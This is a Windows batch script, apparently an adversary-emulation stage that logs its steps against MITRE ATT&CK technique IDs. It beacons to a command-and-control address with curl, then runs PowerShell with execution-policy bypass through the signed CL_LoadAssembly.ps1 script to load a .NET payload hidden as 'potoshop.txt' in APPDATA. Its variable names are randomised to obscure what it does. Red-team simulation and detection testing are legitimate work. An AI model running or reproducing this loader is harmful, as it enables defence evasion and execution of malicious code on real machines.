@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\8505\6279cbea
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8505-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=potoshop.txt
SET ewjmdkff=8505

REM Derived variables
SET abws=%APPDATA%\!pudaazx!
SET hgql=!abws!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: script_started=stage1_bat>> "!hgql!" 2>nul

REM C2 Heartbeat
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_start=!drguvr!>> "!hgql!" 2>nul
curl -k -s -o nul "!drguvr!"
IF !ERRORLEVEL! EQU 0 (
    SET feey=1
    SET hjjj=
    echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete=success>> "!hgql!" 2>nul
) ELSE (
    SET feey=0
    SET hjjj=connection_failed
    echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete=failed_errorlevel=!ERRORLEVEL!>> "!hgql!" 2>nul
)
echo [!DATE! !TIME!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1105|Ingress Tool Transfer=!feey!:!hjjj!>> "!hgql!" 2>nul

REM Change to Audio directory
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_start=C:\Windows\diagnostics\system\Audio>> "!hgql!" 2>nul
cd /d C:\Windows\diagnostics\system\Audio
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_end=!CD!>> "!hgql!" 2>nul

REM Execute assembly via CL_LoadAssembly.ps1
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: assembly_load_start=!syjfr!>> "!hgql!" 2>nul
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath '!pjkcpgw!\!syjfr!';[Program]::Dale()"
IF !ERRORLEVEL! EQU 0 (
    SET feey=1
    SET hjjj=
    echo [!DATE! !TIME!][DEBUG][!hlbnp!]: assembly_load_complete=success>> "!hgql!" 2>nul
) ELSE (
    SET feey=0
    SET hjjj=assembly_load_failed
    echo [!DATE! !TIME!][DEBUG][!hlbnp!]: assembly_load_complete=failed_errorlevel=!ERRORLEVEL!>> "!hgql!" 2>nul
)
echo [!DATE! !TIME!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution=!feey!:!hjjj!>> "!hgql!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: script_completed=exit_code=!ERRORLEVEL!>> "!hgql!" 2>nul